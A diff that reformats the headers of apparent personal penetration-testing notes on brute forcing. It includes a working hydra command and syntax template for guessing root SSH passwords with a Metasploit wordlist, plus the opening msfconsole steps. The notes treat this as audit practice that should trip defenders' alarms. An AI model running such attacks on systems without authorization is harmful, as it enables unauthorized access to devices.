@@ -1,6 +1,4 @@
-================================================
-brute forcing
-================================================
+=== BRUTE FORCING ===
 Aggressive form of penetration testing, used in audits to ring bells for blue team. If no bells ring, big yikes for blue team/defence.
 
 Loud and proud method to gaining access to devices.
@@ -10,11 +8,9 @@ Application in use: hydra
 Command: hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<ip of device to atk> -t 4 -V
 
 Syntax: hydra -l root -P <location of wordlist> <protocol><ip of device to atk -t 4 -V
-================================================
-msfconsole brute forcing instance
-================================================
-Commands
-================================================
+
+--- msfconsole brute forcing instance ---
+--- Commands ---
 
 > search ssh
 (auxillary module)
